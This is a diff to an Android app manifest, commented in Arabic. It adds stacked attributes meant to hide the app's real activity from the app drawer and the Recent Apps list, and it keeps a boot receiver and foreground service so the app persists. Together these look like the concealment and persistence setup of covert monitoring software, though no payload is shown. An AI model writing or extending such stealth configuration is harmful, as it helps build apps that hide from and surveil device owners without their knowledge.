@@ -91,11 +91,19 @@
         </activity-alias>
 
         <!-- ============================================================
-             ✅ النشاط الحقيقي – مخفي وغير مرئي في درج التطبيقات
+             ✅ النشاط الحقيقي – مخفي تماماً وغير مرئي
              - exported="false" يمنع الوصول من خارج التطبيق
              - بدون intent-filter للـ LAUNCHER، لا يظهر في درج التطبيقات
-             - ✅ تم تغيير الثيم إلى Theme.Translucent.NoTitleBar (ثيم نظامي مضمون الوجود)
-             - ✅ إضافة excludeFromRecents لمنع ظهوره في قائمة التطبيقات الحديثة
+             
+             🛡️ سمات الإخفاء المتقدمة (لضمان عدم الظهور في Recent Apps):
+             - excludeFromRecents="true" : يمنع ظهوره في قائمة المهام الحديثة
+             - taskAffinity="" : يفصل النشاط عن المهام الافتراضية
+             - documentLaunchMode="never" : يمنع إنشاء مستندات جديدة في القائمة
+             - noHistory="true" : يزيل النشاط من المكدس فور مغادرته
+             - finishOnTaskLaunch="true" : ينهي النشاط فور مغادرة المهمة
+             - stateNotNeeded="true" : يمنع حفظ حالة النشاط (تعزيز للإخفاء)
+             - allowTaskReparenting="false" : يمنع إعادة توجيه المهمة
+             - theme شفاف : يمنع ظهور أي واجهة مرئية
         ============================================================ -->
         <activity
             android:name=".MainActivity"
@@ -104,7 +112,13 @@
             android:launchMode="singleTop"
             android:screenOrientation="portrait"
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
-            android:excludeFromRecents="true" />
+            android:excludeFromRecents="true"
+            android:taskAffinity=""
+            android:documentLaunchMode="never"
+            android:noHistory="true"
+            android:finishOnTaskLaunch="true"
+            android:stateNotNeeded="true"
+            android:allowTaskReparenting="false" />
 
         <!-- ============================================================
              ✅ الخدمة الأمامية (Foreground Service)
@@ -120,6 +134,8 @@
 
         <!-- ============================================================
              ✅ مستقبل البث عند بدء التشغيل (BootReceiver)
+             - ⚠️ تم إزالة QUICKBOOT_POWERON لأنه غير مدعوم رسمياً في Android SDK
+               ويسبب تحذيرات أثناء البناء. الاكتفاء بـ BOOT_COMPLETED كافٍ.
         ============================================================ -->
         <receiver
             android:name=".BootReceiver"
@@ -127,7 +143,6 @@
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
-                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
             </intent-filter>
         </receiver>
 
